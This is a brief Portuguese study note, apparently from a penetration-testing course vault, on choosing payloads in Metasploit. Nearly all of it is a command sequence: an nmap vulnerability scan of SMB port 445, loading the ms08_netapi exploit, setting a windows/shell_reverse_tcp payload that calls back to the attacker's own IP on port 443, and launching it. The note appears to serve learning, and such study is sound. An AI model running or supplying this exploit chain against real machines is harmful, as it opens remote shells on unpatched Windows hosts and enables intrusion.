<h2 align="center"> Diferencas entre payloads em um cenario real </h2>
<hr>

Podemos utilizar os script do [[Hacking/Desec/Scanning/NMAP]] pra buscar vulnerabilidades dentro do metasploit

```sh
db_nmap --open -p 445 <IP> --script=vuln -Pn
search <vuln>
use exploit/windows/smb/ms08_netapi
show options
set RHOST <IP>
vulns
show payloads
set payload windows/shell_reverse_tcp
set LHOST <NOSSOIP>
set LPORT 443
exploit
```